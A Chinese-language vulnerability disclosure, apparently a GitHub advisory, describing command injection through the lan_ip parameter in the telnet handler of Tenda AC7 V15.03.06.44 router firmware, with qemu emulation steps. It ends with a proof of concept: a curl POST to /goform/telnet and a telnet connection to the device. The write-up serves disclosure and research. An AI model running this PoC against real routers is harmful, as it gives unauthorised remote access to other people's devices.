概述
--

固件下载网站：[AC7 V1.0 升级软件](https://www.tenda.com.cn/material/show/102776)
![image](https://github.com/user-attachments/assets/c15fa54c-802a-45a4-aa5f-18607632f90b)

### 环境模拟

直接使用原本的固件中的httpd会因为环境检查导致模拟不成功，这里提供patch后的httpd文件(本项目中的a7__V15.03.06.44_httpd_ok文件)，（修改汇编强制跳过环境检查步骤）：

模拟命令：

```text-x-haskell
sudo qemu-mipsel-static -L . ./bin/httpd
```

受攻击版本
-----

TenDa   AC7   V15.03.06.44

漏洞详情
----

**在Tenda AC7 V1.0\_V15.03.06.44设备中找到一个问题 ：此tendatelnet函数处理http中的请求，没有对参数lan\_ip做合适的处理，且后面直接与doSystem系统级函数拼接这可能导致命令注入漏洞，也可能会导致shell元字符被启动，例如攻击者可能使用telnet远程访问被攻击的设备。**

![image](https://github.com/user-attachments/assets/560f7ed3-c51b-4052-8b54-d9d149461896)


交叉引用发现调用此函数的上级函数为telnet，一级目录名是goform。

![image](https://github.com/user-attachments/assets/bafe875a-a234-4c27-900f-dc2832326e77)


概念验证
----

```text-x-haskell
curl -i -X POST http://192.168.142.100/goform/telnet -d Raining=Raining --cookie "user=admin" --http0.9
telnet 192.168.142.100 80
```
![image](https://github.com/user-attachments/assets/91ef600d-65a3-4d16-9cd5-965644cdfc3b)
